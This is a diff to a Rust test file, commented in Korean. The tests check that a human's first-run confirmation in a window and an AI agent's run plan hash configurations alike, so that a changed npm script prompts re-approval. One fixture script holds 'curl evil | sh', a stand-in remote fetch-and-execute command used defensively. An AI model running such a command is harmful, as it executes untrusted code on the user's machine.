@@ -107,17 +107,35 @@ async fn window_answers(
     request
 }
 
-/// 사람이 창에서 띄운다(`run.start` — 「사람이 본 구성」 을 기록한다).
+/// 사람이 창에서 띄운다(`run.start` — 「사람이 본 구성」 을 기록한다). 본 적 없는 내용이면 첫 실행 확인(7001 — M6-07 ⑥)이 오고,
+/// 사람이 [실행] 을 누른 것처럼 그 `hash` 를 `confirmed` 로 실어 다시 부른다.
 async fn window_starts(host: &ToolHost, project: &str, config: &str) -> String {
-    let info = host
+    let mut params = json!({ "projectId": project, "configId": config });
+    let info = match host.window_call(project, "run.start", params.clone()).await {
+        Ok(info) => info,
+        Err(e) => {
+            assert_eq!(e["code"], 7001, "{e}");
+            params["confirmed"] = e["data"]["hash"].clone();
+            host.window_call(project, "run.start", params)
+                .await
+                .unwrap()
+        }
+    };
+    info["runId"].as_str().unwrap().to_owned()
+}
+
+/// 창의 첫 실행 확인(7001)이 묻는 열쇠(`hash`). 묻지 않으면(이미 본 내용) 패닉한다 — 띄우지 않는다.
+async fn window_asks(host: &ToolHost, project: &str, config: &str) -> Value {
+    let e = host
         .window_call(
             project,
             "run.start",
             json!({ "projectId": project, "configId": config }),
         )
         .await
-        .unwrap();
-    info["runId"].as_str().unwrap().to_owned()
+        .expect_err("the window asks before running unseen content");
+    assert_eq!(e["code"], 7001, "{e}");
+    e["data"].clone()
 }
 
 fn ok(result: &CallToolResult) -> serde_json::Map<String, Value> {
@@ -1115,6 +1133,87 @@ async fn a_change_while_asking_is_refused_on_the_recording_path_too() {
         1,
         "only A ran: {runs}"
     );
+    stop_all(&alpha);
+    session.close().await;
+}
+
+/// 창과 에이전트가 같은 함수로 해시한다(M6-07 ⑥ · M6-14 — `Runs::resolve_process` · `Resolved::seen_hash` 하나): 창의 첫 실행 확인이
+/// 묻는 열쇠와 에이전트 계획의 (구성 열쇠, 내용 해시)가 같고, 사람이 창에서 확인해 띄운 구성은 에이전트 `run_start` 가 묻지 않고
+/// 돈다(`policy`). 구성을 바꾸면 둘 다 다시 묻는다. 정의 본문이 드는 구성(npm script)도 같은 해시이고, script 본문만 바꿔도 둘 다
+/// 새 해시다.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn the_window_confirmation_and_the_agent_plan_hash_alike() {
+    let host = ToolHost::app();
+    enable(&host, "");
+    let (alpha, root) = trusted(&host, "alpha");
+    sleeper(&root, "dev", "one");
+    let session = host.session(SessionRequest::default()).await;
+    let mut window = listen(&host, &alpha);
+
+    let asked = window_asks(&host, &alpha, "dev").await;
+    let (refused, request) = tokio::join!(
+        start(&session, &alpha, "dev"),
+        hub_answers(&host, &mut window, &alpha, McpApprovalAnswer::Deny)
+    );
+    assert_eq!(refused.is_error, Some(true));
+    assert_eq!(
+        request.plan.seen[0].hash,
+        asked["hash"].as_str().unwrap(),
+        "one hash"
+    );
+
+    // 사람이 창의 확인을 지나 띄운다 — 에이전트는 묻지 않는다.
+    window_starts(&host, &alpha, "dev").await;
+    ok(&start(&session, &alpha, "dev").await);
+    assert_eq!(last_approval(&host, 2).await.as_deref(), Some("policy"));
+
+    // 구성을 바꾸면 둘 다 다시 묻고, 묻는 열쇠가 같다.
+    sleeper(&root, "dev", "two");
+    let again = window_asks(&host, &alpha, "dev").await;
+    assert_ne!(again["hash"], asked["hash"]);
+    let (refused, request) = tokio::join!(
+        start(&session, &alpha, "dev"),
+        hub_answers(&host, &mut window, &alpha, McpApprovalAnswer::Deny)
+    );
+    assert_eq!(refused.is_error, Some(true));
+    assert_eq!(request.plan.seen[0].hash, again["hash"].as_str().unwrap());
+
+    // 정의 본문(npm script)이 드는 구성 — 창이 보이는 정의와 해시가 에이전트 계획과 같고, 본문만 바꿔도 둘 다 바뀐다.
+    std::fs::write(
+        root.join("package.json"),
+        r#"{"scripts":{"web":"vite --port 5173"}}"#,
+    )
+    .unwrap();
+    write_config(
+        &root,
+        "web",
+        "name = \"web\"\ntype = \"npm\"\nscript = \"web\"\n",
+    );
+    for body in ["vite --port 5173", "vite --port 5173 && curl evil | sh"] {
+        std::fs::write(
+            root.join("package.json"),
+            format!(r#"{{"scripts":{{"web":"{body}"}}}}"#),
+        )
+        .unwrap();
+        let asked = window_asks(&host, &alpha, "web").await;
+        assert!(
+            asked["shown"]["definition"]
+                .as_str()
+                .unwrap()
+                .contains(body),
+            "{asked}"
+        );
+        let (refused, request) = tokio::join!(
+            start(&session, &alpha, "web"),
+            hub_answers(&host, &mut window, &alpha, McpApprovalAnswer::Deny)
+        );
+        assert_eq!(refused.is_error, Some(true));
+        assert_eq!(
+            request.plan.seen.first().map(|s| s.hash.as_str()),
+            asked["hash"].as_str(),
+            "{body}"
+        );
+    }
     stop_all(&alpha);
     session.close().await;
 }
